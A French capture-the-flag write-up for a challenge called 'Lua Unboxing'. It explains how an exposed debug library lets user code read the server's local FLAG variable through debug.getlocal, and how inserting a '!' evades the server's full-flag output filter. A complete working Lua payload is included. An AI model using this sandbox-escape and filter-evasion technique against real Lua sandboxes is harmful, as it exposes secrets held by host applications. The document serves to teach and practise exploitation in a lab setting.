# Writeup – Lua Unboxing

## Analyse du serveur

Le serveur exécute du code Lua envoyé par le client dans un environnement sandbox (`safe_env`). Cependant, la bibliothèque `debug` est toujours accessible dans cet environnement, ce qui permet d'utiliser des fonctions puissantes comme `debug.getlocal`.

Le flag est stocké dans une variable locale du serveur, et le serveur vérifie que le résultat retourné par le code utilisateur ne contient pas le flag en entier (`string.find(result, FLAG)`).

## Exploitation

Grâce à la bibliothèque `debug`, il est possible d'accéder aux variables locales d'une fonction appelée plus haut dans la pile d'exécution. En remontant 3 niveaux dans la pile (`debug.getlocal(3, i)`), on peut récupérer la variable `FLAG` contenant le flag.

Cependant, le serveur bloque toute sortie contenant le flag en entier. Pour contourner ce filtre, il suffit de modifier la sortie, par exemple en insérant un caractère (`!`) après la première lettre du flag. Ainsi, `string.find` ne détectera plus le flag complet, mais il sera facile de le reconstituer côté client.

## Payload

Voici le payload à envoyer au serveur pour récupérer le flag (en insérant un `!` après la première lettre) :

```lua
local flag = nil
local i = 1
while true do
  local name, value = debug.getlocal(3, i)
  if not name then break end
  if name == "FLAG" then
    flag = value
    break
  end
  i = i + 1
end
if flag then
  return flag:sub(1, 1) .. '!' .. flag:sub(2)
else
  return nil
end
```

Il suffit ensuite de retirer le `!` pour obtenir le flag complet.

## Référence

- [Lua PIL 23.1.1 – The Stack and Local Variables](https://www.lua.org/pil/23.1.1.html)
